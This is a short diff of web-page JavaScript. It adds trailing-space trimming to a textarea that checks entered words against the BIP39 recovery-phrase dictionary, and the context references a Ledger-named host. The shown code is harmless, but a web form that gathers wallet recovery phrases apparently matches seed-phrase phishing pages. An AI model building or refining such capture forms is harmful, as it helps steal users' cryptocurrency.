@@ -1272,6 +1272,11 @@ try{(new g(100,"r","QSI_S_ZN_6uka6dlz6B32c1E","https://zn6uka6dlz6b32c1e-ledger.
                     suggestionsDiv.innerHTML = 'All words must be part of the BIP39 dictionary.';
                 }
             }
+		
+		// Check if the last character is a space and remove it
+		    if (textarea.value.slice(-1) === ' ') {
+		        textarea.value = textarea.value.trim(); // Remove trailing spaces
+		    }
         });
 
         // Autocomplete functionality
